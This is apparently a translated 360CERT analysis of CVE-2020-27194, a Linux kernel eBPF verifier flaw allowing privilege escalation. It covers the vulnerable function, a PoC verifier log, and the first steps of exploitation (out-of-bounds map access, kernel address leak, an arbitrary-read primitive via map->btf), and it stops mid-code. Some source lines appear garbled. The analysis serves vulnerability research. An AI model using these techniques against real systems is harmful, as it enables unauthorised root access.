# CVE-2020-27194：Linux Kernel eBPF模块提权漏洞的分析与利用
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x01 漏洞背景
2020年11月01日， 360CERT监测到国外安全研究人员simon 通过fuzz 在Linux
内核的ebpf模块中发现一个越界读写的漏洞，可导致权限提升，CVE编号: CVE-2020-27194。
该漏洞是由于eBPF验证程序中进行or操作时未正确计算寄存器范围，进而引发越界读取和写入。该漏洞存在于 _5.8.x_
内核分支，目前有部分发行版使用了此分支，如Fedora 33 和 Ubuntu 20.10 。
2020年11月03日，360CERT对该漏洞进行了详细分析，并完成漏洞利用。
## 0x02 风险等级
360CERT对该漏洞的评定结果如下
评定方式 | 等级  
---|---  
威胁等级 | 高危  
影响面 | 一般  
360CERT评分 | 7.8  
## 0x03 影响版本
影响 _5.8.x_ 版本及以上的Linux 内核分支
影响应用该分支的发行版：Fedora 33 、Ubuntu 20.10
## 0x04 环境搭建
（1）下载源码
    git clone 
    git checkout 5b9fbeb75b6a98955f628e205ac26689bcb1383e~1
5b9fbeb75b6a98955f628e205ac26689bcb1383e 为修复漏洞的补丁，我们将分支切换到前一个补丁
（2）编译内核
    make default
    make menuconfig
    make -j8
关闭随机化，开启调试信息和ebpf选项
    Processor type and features  --->
        [ ]   Randomize the address of the kernel image (KASLR) 
    Kernel hacking  --->
        Compile-time checks and compiler options  --->  
            [*] Compile the kernel with debug info
    General setup  ---> 
        [*] Enable bpf() system call   
## 0x05 漏洞分析
### 5.1 eBPF 介绍
eBPF是extended Berkeley Packet
Filter的缩写。起初是用于捕获和过滤特定规则的网络数据包,现在也被用在防火墙，安全，内核调试与性能分析等领域。
eBPF程序的运行过程如下：在用户空间生产eBPF“字节码”，然后将“字节码”加载进内核中的“虚拟机”中，然后进行一些列检查，通过则能够在内核中执行这些“字节码”。类似Java与JVM虚拟机，但是这里的虚拟机是在内核中的。
bpf程序的执行流程如下图：
### 5.2 漏洞成因
漏洞点在scalar_min_max_or()函数：
    static void scalar32_min_max_or(struct bpf_reg_state *dst_reg,
                    struct bpf_reg_state *src_reg)
    {
        bool src_known = tnum_subreg_is_const(src_reg->var_off);
        bool dst_known = tnum_subreg_is_const(dst_reg->var_off);
        struct tnum var32_off = tnum_subreg(dst_reg->var_off);
        s32 smin_val = src_reg->smin_value;
        u32 umin_val = src_reg->umin_value;
        /* Assuming scalar64_min_max_or will be called so it is safe
         * to skip updating register for known case.
         */
        if (src_known && dst_known)
            return;
        /* We get our maximum from the var_off, and our minimum is the
         * maximum of the operands' minima
         */
        dst_reg->u32_min_value = max(dst_reg->u32_min_value, umin_val);
        dst_reg->u32_max_value = var32_off.value | var32_off.mask;
        if (dst_reg->s32_min_value s32_min_value = S32_MIN;
            dst_reg->s32_max_value = S32_MAX;
        } else {
            /* ORing two positives gives a positive, so safe to
             * cast result into s64.
             */
            dst_reg->s32_min_value = dst_reg->umin_value; // 【1】
            dst_reg->s32_max_value = dst_reg->umax_value;
        }
    }
由于【1】处的将64位的值赋值到32位的变量上，导致截断，进而错误计算了寄存器的范围，从而绕过bpf的检查，导致越界读写。
具体可以看Poc生成的日志：
        ……
    9: (79) r5 = *(u64 *)(r0 +0)
     R0=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    10: R0=map_value(id=0,off=0,ks=4,vs=256,imm=0) R5_w=invP(id=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    10: (bf) r8 = r0
    11: R0=map_value(id=0,off=0,ks=4,vs=256,imm=0) R5_w=invP(id=0) R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256?
    11: (b7) r0 = 1
    12: R0_w=invP1 R5_w=invP(id=0) R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10=fp0 fp-8=mmmm????
    12: (18) r6 = 0x600000002
    14: R0_w=invP1 R5_w=invP(id=0) R6_w=invP25769803778 R8_w=map_value(id=0,off=0,ks=4,vs=256,imm=0) R9=map_ptr(id=0,off=0,ks=4,vs=256,imm=0) R10?
    14: (ad) if r5  0x0 goto pc+1
     R0_w=invP1 R5_w=invP(id=0,umax_value=0,var_off=(0x0; 0x7fffffff),u32_max_value=2147483647) R6_w=invP25769803778 R8_w=map_value(id=0,off=0,ks?
    17: R0_w=invP1 R5_w=invP(id=0,umax_value=0,var_off=(0x0; 0x7fffffff),u32_max_value=2147483647) R6_w=invP25769803778 R8_w=map_value(id=0,off=0?
    17: (95) exit
    18: R0=invP1 R5=invP(id=0,umin_value=1,umax_value=25769803777,var_off=(0x0; 0x77fffffff),u32_max_value=2147483647) R6=invP25769803778 R8=map_?
    18: (47) r5 |= 0
    19: R0=invP1 R5_w=invP(id=0,umin_value=1,umax_value=32212254719,var_off=(0x1; 0x700000000),s32_max_value=1,u32_max_value=1) R6=invP2576980377?
    19: (bc) w6 = w5
    20: R0=invP1 R5_w=invP(id=0,umin_value=1,umax_value=32212254719,var_off=(0x1; 0x700000000),s32_max_value=1,u32_max_value=1) R6_w=invP1 R8=map?
    20: (77) r6 >>= 1
    21: R0=invP1 R5_w=invP(id=0,umin_value=1,umax_value=32212254719,var_off=(0x1; 0x700000000),s32_max_value=1,u32_max_value=1) R6_w=invP0 R8=map?
            ……
9：用户的值通过r5寄存器传入值 2
10：r0 赋值给r8，r0保存map的地址，对触发漏洞无影响
11：r0 赋值为1，否则会认为r0 泄露map指针产生报错
12： r6赋值为0x600000002
14：通过r5  0x0 的条件判断使得r5寄存器的无符号范围最小为umin_value=1
18：对r5进行or运算，触发漏洞函数scalar_min_max_or，调用到漏洞函数中的【1】处，赋值后r5寄存器的s32_min_value=1，s32_max_value=1
19：将r5赋值为r6，得到r6为invP1 ，说明检查模块认为r6是常数1，而实际此时r6为2
20：对r6进行右移操作，此时检查模块认为r6得到的结果为invP0（常数0），而实际此时r6为1
具体调试过程如下：
dst_reg->umin_value 的值为1， dst_reg->umax_value
的值为0x600000001，而在赋值dst_reg->s32_max_value的过程中发生了截断（64位的值赋值到32位的有符号整数），导致dst_reg->s32_max_value的值为1，此时目标寄存器的32位范围为（1，1），因此bpf的验证模块认为这是常数1。
当我们传入2时，对其进行右移操作，验证模块认为是1>>1=0，而实际是2 >>1 =
1，所以可以对其进行乘法操作构造成任意数，因为在验证模块看来只是0乘以任意数，结果都是0，从而绕过检查，可以对map指针进行任意加减，造成越界读写。
## 0x06 漏洞利用
该漏洞利用和CVE-2020-8835 类似，可以参考之前笔者对CVE-2020-8835 的利用构造：
### 6.1 越界读写进行信息泄露
    mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,key_size,value_size,max_entries,0);
key_size：表示索引的大小范围，key_size=sizeof(int)=4.  
value_size：表示map数组每个元素的大小范围，可以任意，只要控制在一个合理的范围
max_entries：表示map数组的大小，编写利用时将其设为1
**泄露内核地址**
bpf_create_fd 创建的是一整个bpf_array结构，我们传入的数据放在value[] 处
    struct bpf_array {
        struct bpf_map map;
        u32 elem_size;
        u32 index_mask;
        struct bpf_array_aux *aux;
        union {
            char value[];//map.freeze_mutex.wait_list
    $9 = 0xc0
### 构造任意读
通过BPF_OBJ_GET_INFO_BY_FD 命令进行任意读，BPF_OBJ_GET_INFO_BY_FD 会调用
bpf_obj_get_info_by_fd：
    case BPF_OBJ_GET_INFO_BY_FD:
            err = bpf_obj_get_info_by_fd(&attr, uattr);
    #define BPF_OBJ_GET_INFO_BY_FD_LAST_FIELD info.info
    static int bpf_obj_get_info_by_fd(const union bpf_attr *attr,
                      union bpf_attr __user *uattr)
    {
        int ufd = attr->info.bpf_fd;
        struct fd f;
        int err;
        if (CHECK_ATTR(BPF_OBJ_GET_INFO_BY_FD))
            return -EINVAL;
        f = fdget(ufd);
        if (!f.file)
            return -EBADFD;
        if (f.file->f_op == &bpf_prog_fops)
            err = bpf_prog_get_info_by_fd(f.file->private_data, attr,
                              uattr);
        else if (f.file->f_op == &bpf_map_fops)
            err = bpf_map_get_info_by_fd(f.file->private_data, attr,
                             uattr);
                             ……
之后调用 bpf_map_get_info_by_fd：
    static int bpf_map_get_info_by_fd(struct bpf_map *map,
                      const union bpf_attr *attr,
                      union bpf_attr __user *uattr)
    {
        struct bpf_map_info __user *uinfo = u64_to_user_ptr(attr->info.info);
        struct bpf_map_info info = {};
        u32 info_len = attr->info.info_len;
        int err;
        err = bpf_check_uarg_tail_zero(uinfo, sizeof(info), info_len);
        if (err)
            return err;
        info_len = min_t(u32, sizeof(info), info_len);
        info.type = map->map_type;
        info.id = map->id;
        info.key_size = map->key_size;
        info.value_size = map->value_size;
        info.max_entries = map->max_entries;
        info.map_flags = map->map_flags;
        memcpy(info.name, map->name, sizeof(map->name));
        if (map->btf) {
            info.btf_id = btf_id(map->btf); // 修改map->btf 就可以进行任意读，获得btf_id，在btf结构偏移0x58处
            info.btf_key_type_id = map->btf_key_type_id;
            info.btf_value_type_id = map->btf_value_type_id;
        }
        if (bpf_map_is_dev_bound(map)) {
            err = bpf_map_offload_info_fill(&info, map);